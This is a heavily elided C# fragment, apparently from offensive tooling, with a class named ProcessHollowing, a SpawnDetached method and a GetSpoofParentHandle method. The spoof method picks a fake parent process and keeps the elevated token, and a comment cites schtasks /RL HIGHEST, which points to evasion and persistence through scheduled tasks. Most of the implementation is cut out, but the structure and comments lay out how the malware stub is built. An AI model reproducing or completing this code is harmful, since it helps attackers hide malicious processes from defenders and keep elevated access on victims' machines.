...
internal static class ProcessHollowing
{
    ...
    public static int SpawnDetached(string exePath, IReadOnlyDictionary<string, string?> envOverrides)
    {
        ...
        try
        {
            ...
            StubLog.Info($"[SpawnDetached] ok pid={pid}");
    ...
    private static nint GetSpoofParentHandle()
    {
        if (IsElevated())
        {
            ...
            // Elevated but no system parent found — return 0 (no spoof) to preserve
            // the elevated token. Falling through to explorer.exe would de-elevate
            // the child process token, breaking tasks like schtasks /RL HIGHEST.
            return 0;
        }
